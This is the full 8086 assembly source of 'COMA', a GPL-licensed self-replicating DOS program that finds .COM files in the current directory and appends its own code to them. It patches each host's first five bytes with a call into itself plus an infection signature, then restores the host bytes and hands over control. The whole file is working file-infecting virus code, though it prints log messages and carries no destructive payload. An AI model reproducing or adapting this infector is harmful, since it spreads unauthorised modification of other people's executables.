; Copyright (C) 2016 Ramon Novoa
; <ramonnovoa AT gmail DOT com> This
; program is free software: you can
; redistribute it and/or modify it under
; the terms of the GNU General Public
; License as published by the Free
; Software Foundation, either version 3
; of the License, or (at your option) any
; later version.
;
; This program is distributed in the hope
; that it will be useful, but WITHOUT ANY
; WARRANTY; without even the implied
; warranty of MERCHANTABILITY or FITNESS
; FOR A PARTICULAR PURPOSE.  See the GNU
; General Public License for more
; details.
;
; You should have received a copy of the
; GNU General Public License along with
; this program.  If not, see
; <http://www.gnu.org/licenses/>.

;----------------------------------------
; COMA Self-Replicating Program.
;----------------------------------------
use16    ; Generate code designed to run
         ; in 16-bit mode.
cpu 8086 ; Assemble only 8086 instruction
         ; set.

sign  equ 41121d    ; COMA's signature.
cr    equ 0dh       ; Carriage return.
lf    equ 0ah       ; Line feed.

; Size of COMA.
coma_size equ coma_end - coma_start

; Approximate size of COMA's stack.
coma_stack equ 16d

; Data offsets relative to the start of
; COMA. Since COMA may be loaded at
; different memory locations we cannot
; rely on absolute offsets.
hdr   equ _hdr   - coma_start
host  equ _host  - coma_start
fh    equ _fh    - coma_start
buff  equ _buff  - coma_start
img   equ _img   - coma_start
cimg  equ _cimg  - coma_start
dta   equ _dta   - coma_start
fsize equ dta + 1ah ; File size offset
                    ; inside the DTA.
fname equ dta + 1eh ; File name offset
                    ; inside the DTA.
msg01 equ _msg01 - coma_start
msg02 equ _msg02 - coma_start
msg03 equ _msg03 - coma_start
err01 equ _err01 - coma_start
err02 equ _err02 - coma_start
err03 equ _err03 - coma_start
err04 equ _err04 - coma_start
err05 equ _err05 - coma_start
err06 equ _err06 - coma_start

org 100h ; Leave room for the Program
         ; Segment Prefix.

coma_start:
 jmp coma_code

;----------------------------------------
; Data.
;----------------------------------------
_hdr:   dw sign ; Start the header with
                ; COMA's signature.
_host:  db '*.com', 0 ; Host filespec.
_fh:    dw 0          ; Host file handle.
_buff:  times 5 db 0  ; Temporary buffer.
_img:   times 5 db 0  ; First 5 bytes of
                      ; the host.
_cimg:  times 5 db 0  ; First 5 bytes of
                      ; the CURRENT host.
_dta:   times 128 db 0 ; COMA's own DTA.
_msg01: db '[COMA] Found candidate: $'
_msg02: db '[COMA] Attaching to host.'
        db cr, lf, '$'
_msg03: db '[COMA] Success.'
        db cr, lf, '$'
_err01: db '[ERR] No candidates found.'
        db cr, lf, '$'
_err02: db '[ERR] Error opening file.'
        db cr, lf, '$'
_err03: db '[ERR] File too big.'
        db cr, lf, '$'
_err04: db '[ERR] Read error.'
        db cr, lf, '$'
_err05: db '[ERR] COMA already present.'
        db cr, lf, '$'
_err06: db '[ERR] Write error.'
        db cr, lf, '$'

;----------------------------------------
; Print an ASCIIZ string followed by
; CRLF.
; Params:
;  SI: Offset of the first char.
;----------------------------------------
printz:
 push ax
 push dx
 push si
 
 mov ah, 02h ; Write character to STDOUT.
 
printz_loop:
 mov dl, [si] ; Read a character.
 test dl, dl  ; Stop on NULL.
 jz printz_end
 
 int 21h
 inc si ; Move on to the next character.
 jmp printz_loop
 
printz_end:
 ; CR.
 mov dl, cr
 int 21h
 
 ; LF.
 mov dl, lf
 int 21h
 
 pop si
 pop dx
 pop ax
 ret
 
;----------------------------------------
; Find a host candidate. Updates the DTA
; and sets the carry flag on error.
;----------------------------------------
find:
 push ax
 push cx
 push dx
 
 ; Find the first matching host.
 lea dx, [bp + host] ; DX points to
                     ; _host.
 xor cx, cx          ; Attribute mask. We
                     ; will ignore hidden
					 ; and system files.
 mov ah, 4eh         ; Find first.
 int 21h
 jnc find_ok

 ; Error.
 lea dx, [bp + err01] ; DX points to
                      ; _err01.
 mov ah, 09h ; Write string to STDOUT.
 int 21h
 
 stc ; Signal error.
 jmp find_end

find_ok:
 clc ; Signal success.

find_end:
 pop dx
 pop cx
 pop ax
 ret

;----------------------------------------
; Find the next host candidate. Must be
; called after find. Like find, updates
; the DTA and sets the carry flag on
; error.
;----------------------------------------
fnext:
 push ax
 push dx
 
 mov ah, 4fh ; Find next.
 int 21h
 jnc fnext_ok

fnext_err:
 ; Error.
 lea dx, [bp + err01] ; DX points to
                      ; _err01.
 mov ah, 09h ; Write string to STDOUT.
 int 21h
 
 stc ; Signal error.
 jmp fnext_end

fnext_ok:
 clc ; Signal success.

fnext_end:
 pop dx
 pop ax
 ret
 
;----------------------------------------
; Make sure the host candidate in the DTA
; is valid. Sets the carry flag on error.
;----------------------------------------
vrfy:
 push ax
 push bx
 push cx
 push dx
 
 ; Open the candidate file.
 lea dx, [bp + fname] ; Filename.
 mov al, 02h ; Read/Write access.
 mov ah, 3dh ; Open file.
 int 21h
 jnc vrfy_size

 ; Error.
 lea dx, [bp + err02] ; DX points to
                      ; _err02.
 mov ah, 09h ; Write string to STDOUT.
 int 21h
 jmp vrfy_err

vrfy_size:
 mov word [bp + fh], ax ; Save the file
                        ; handle.
 
 ; Read the file size from the DTA.
 ; The second word must be zero to fit in
 ; one segment.
 cmp word [bp + fsize + 2], 0
 jne vrfy_toobig
 
 mov ax, [bp + fsize] ; Read the first
                      ; word.
 
 ; Do the host + the PSP + COMA + COMA's
 ; own stack fit in a 64KB segment?
 ;
 ; +-------+ 0xFFFF
 ; | Stack |
 ; +-------+
 ; | COMA  |
 ; +-------+ BP
 ; | Host  |
 ; +-------+ 0x0100
 ; | PSP   |
 ; +-------+ 0x0000
 ;
 add ax, coma_size + coma_stack + 100h
 jnc vrfy_read

vrfy_toobig:
 ; Error.
 mov dx, bp
 lea dx, [bp + err03] ; DX points to
                      ; _err03.
 mov ah, 09h ; Write string to STDOUT.
 int 21h
 jmp vrfy_err

vrfy_read:
 ; Read the first 5 bytes.
 mov cx, 5d          ; Read 5 bytes.
 mov bx, [bp + fh]   ; From the file
                     ; handle.
 lea dx, [bp + img]  ; Into the buffer.
                     ; DX points to
                     ; _img.
 mov ah, 3fh         ; Read file.
 int 21h
 jnc vrfy_sign

 ; Error.
 lea dx, [bp + err04] ; DX points to
                      ; _err04.
 mov ah, 09h ; Write string to STDOUT.
 int 21h
 jmp vrfy_err

vrfy_sign:
 ; Look for COMA's signature in the
 ; first 5 bytes.
 cmp word [bp + img + 3], sign
 jne vrfy_ok

 ; Error.
 lea dx, [bp + err05] ; DX points to
                      ; _err05.
 mov ah, 09h ; Write string to STDOUT.
 int 21h

vrfy_err:
 stc ; Signal error.
 jmp vrfy_end
 
vrfy_ok:
 clc ; Signal success.

vrfy_end:
 pop dx
 pop cx
 pop bx
 pop ax
 ret

;----------------------------------------
; Attach to the host in the DTA. Sets the
; carry flag on error.
;----------------------------------------
attach:
 push ax
 push bx
 push cx
 push di
 push dx
 push si
 
 ; Move to the end of the host.
 xor cx, cx  ; Offset in CX:DX.
 xor dx, dx
 mov al, 02h ; From the end of the file.
 mov ah, 42h ; Seek.
 int 21h
 
 ; Copy COMA's code.
 mov bx, [bp + fh] ; File handle.
 mov cx, coma_size ; Number of bytes to
                   ; write.
 mov dx, bp        ; Data to write. DX
                   ; points to the start
                   ; of COMA now.
 mov ah, 40h       ; Write file.
 int 21h
 jnc attach_hdr

 ; Error.
 lea dx, [bp + err06] ; DX points to
                      ; _err06.
 mov ah, 09h ; Write string to STDOUT.
 int 21h
 jmp attach_err

attach_hdr:
 ; Replace the first 5 bytes of the host
 ; with a call (0E8H) to COMA and COMA's
 ; signature.
 ;
 ; -------+--------------+-------------
 ; Byte 1 | Byte 2       | Byte 3
 ; -------+--------------+-------------
 ; E8     | Offset's LSB | Offset's MSB
 ; -------+--------------+-------------
 ;
 ; ----------------+----------------
 ; Byte 4          | Byte 5
 ; ----------------+----------------
 ; Signature's LSB | Signature's MSB
 ; ----------------+----------------
 ;
 mov byte [bp + buff], 0e8h ; Byte 1.
 
 ; Do not forget to substract the call
 ; instruction itself (-3) when
 ; calculating the callee's relative
 ; offset.
 mov ax, [bp + fsize] ; Jump ahead of the
                      ; host.
 sub ax, 3d
 mov word [bp + buff + 1], ax ; Bytes 2
                              ; and 3.
 
 ; Lastly add the signature.
 mov word [bp + buff + 3], sign ; Bytes 4
                                ; and 5.

 ; Move to the start of the host.
 mov bx, [bp + fh] ; File handle.
 xor cx, cx  ; Offset in CX:DX.
 xor dx, dx
 xor al, al  ; From the start of the
             ; file.
 mov ah, 42h ; Seek.
 int 21h

 ; Write the 5 bytes.
 mov bx, [bp + fh] ; File handle.
 mov cx, 5d ; Number of bytes to write.
 lea dx, [bp + buff] ; Data to write. DX
                     ; points to _buff.
 mov ah, 40h ; Write file.
 int 21h
 jnc attach_ok

 ; Error.
 lea dx, [bp + err06] ; DX points to
                      ; _err06.
 mov ah, 09h ; Write string to STDOUT.
 int 21h

attach_err:
 stc ; Signal error.
 jmp attach_end

attach_ok:
 clc ; Signal success.

attach_end:
 pop si
 pop dx
 pop di
 pop cx
 pop bx
 pop ax
 ret

;----------------------------------------
; Code.
;----------------------------------------
coma_code:

 ; Find out where in memory we are
 ; loaded. Load the offset of the start
 ; of COMA into BP.
 call coma_call ; Push IP into the
                ; stack.
coma_call:
 pop bp ; Pop IP. BP points here.
 sub bp, coma_call - coma_start ; BP
                                ; points
                                ; to the
                                ; start
                                ; of
                                ; COMA.

 ; Copy the first 5 bytes of the CURRENT
 ; host before attaching to a new one.
 cld
 mov cx, 5d          ; Copy 5 bytes.
 lea si, [bp + img]  ; From _img.
 lea di, [bp + cimg] ; To _cimg.
 rep movsb
 
coma_setdta:
 ; Set our own DTA so that the host's
 ; command line arguments are not
 ; overwritten.
 lea dx, [bp + dta] ; DX points to _dta.
 mov ah, 1ah ; Set DTA.
 int 21h
 
 ; Look for host candidates.
 call find
 jc coma_exit ; No candidates found.

coma_floop:
 ; Log.
 lea dx, [bp + msg01] ; DX points to
                      ; _msg01.
 mov ah, 09h ; Write string to STDOUT.
 int 21h
 
 ; Print the name of the candidate.
 lea si, [bp + fname]
 call printz

 ; Make sure the candidate is valid.
 call vrfy
 jnc coma_attach ; Found a host. Attach
                 ; to it.
 
 ; Close the file handle before looking
 ; for the next host candidate.
 mov bx, [bp + fh]
 mov ah, 3eh ; Close file.
 int 21h

 mov word [bp + fh], 0 ; Mark the file
                       ; handle as
                       ; closed.
 
 ; Find the next candidate.
 call fnext
 jc coma_exit ; No more candidates.
 jmp coma_floop ; Next candidate.

; Attach to the host.
coma_attach:
 ; Log.
 lea dx, [bp + msg02] ; DX points to
                      ; _msg02.
 mov ah, 09h ; Write string to STDOUT.
 int 21h
 
 ; Attach.
 call attach
 jc coma_exit
 
 ; Log.
 lea dx, [bp + msg03] ; DX points to
                      ; _msg03.
 mov ah, 09h ; Write string to STDOUT.
 int 21h

coma_exit:
 ; Close the file handle if it is still
 ; open.
 mov bx, [bp + fh]
 test bx, bx ; Is the file handle NULL?
 jz coma_rstdta
 mov ah, 3eh ; Close file.
 int 21h
 
coma_rstdta:
 ; Reset the DTA.
 mov dx, 80h ; DTA's default offset in
             ; the PSP.
 mov ah, 1ah ; Set DTA.
 int 21h

 ; Are we running inside a host? When
 ; COMA is running on its own the buffer
 ; that holds the host's first five bytes
 ; is empty.
 or word [bp + cimg], 0
 jnz coma_jmphost
 
 ; Exit.
 mov al, 0   ; Return status.
 mov ah, 4ch ; Exit program.
 int 21h

coma_jmphost:
 pop ax ; We called into COMA but never
        ; returned. AX points right after
        ; the first call instruction.
 sub ax, 3 ; Move back to the call
           ; instruction. Now AX points
           ; to the start of the CURRENT
           ; host.
 
 ; Put back the original first 5 bytes of
 ; the host.
 cld
 mov cx, 5            ; Copy 5 bytes.
 lea si, [bp + cimg]  ; From _cimg.
 mov di, ax           ; To the start of
                      ; the CURRENT host.
 rep movsb
 
 ; Jump to the start of the CURRENT host.
 push ax ; Load AX
 ret     ; into IP.
coma_end:


